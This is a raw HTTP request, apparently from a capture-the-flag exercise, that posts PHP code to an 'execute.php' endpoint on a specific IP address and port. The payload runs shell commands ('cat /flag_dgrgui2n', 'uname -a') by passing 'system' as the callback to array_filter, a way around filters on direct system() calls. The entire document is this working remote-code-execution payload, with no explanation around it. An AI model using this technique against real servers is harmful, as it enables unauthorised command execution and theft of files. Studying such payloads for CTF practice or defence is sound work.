```http
POST /execute.php HTTP/1.1
Host: 39.106.16.204:16729
Content-Length: 133
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://39.106.16.204:16729
Referer: http://39.106.16.204:16729/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

code=<?php $array_command = array('cat /flag_dgrgui2n', 'uname -a');
$command = 'system';
array_filter($array_command, $command);
```

